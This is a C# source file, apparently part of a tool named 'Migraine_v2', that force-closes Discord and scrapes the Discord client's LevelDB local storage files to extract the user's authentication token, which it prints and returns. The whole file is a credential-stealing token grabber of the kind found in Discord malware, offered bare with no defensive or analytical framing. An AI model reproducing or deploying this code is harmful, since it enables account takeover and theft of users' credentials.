using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
namespace Migraine_v2.Classes {
    public class Usertoken {
        public static string Get() {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
            foreach (Process process in Process.GetProcessesByName("Discord"))  { process.Kill(); }
            Thread.Sleep(100);
            List<string> list = new List<string>();
            foreach (string text in Usertoken.Tokens(path)) {
                bool flag = text.Length > 50;
                if (flag)
                    list.Add(text);
            }
            Console.Write(string.Join("\n", list));
            return list[list.Count - 1];
        }
        public static List<string> Tokens(string path) {
            DirectoryInfo directoryInfo = new DirectoryInfo(path);
            List<string> list = new List<string>();
            List<string> list2 = new List<string>();
            foreach (FileInfo fileInfo in directoryInfo.GetFiles()) {
                bool flag = fileInfo.Name.EndsWith(".ldb");
                if (flag) { list2.Add(Usertoken.GetToken(path + "\\" + fileInfo.Name)); }
            } return list2;
        }
        public static string GetToken(string path) {
            byte[] bytes = File.ReadAllBytes(path);
            string @string = Encoding.UTF8.GetString(bytes);
            string text = Usertoken.Parse(@string);
            string[] array = text.Split(new char[] {
                '"'
            });
            return array[0].Replace("_state", "");
        }
        private static string Parse(string contents) {
            string text = contents.Substring(contents.IndexOf("oken") + 5);
            string[] array = text.Split(new char[] {
                '"'
            });
            List<string> list = new List<string>();
            list.AddRange(array);
            list.RemoveAt(0);
            array = list.ToArray();
            return string.Join("\"", array);
        }
    }
}
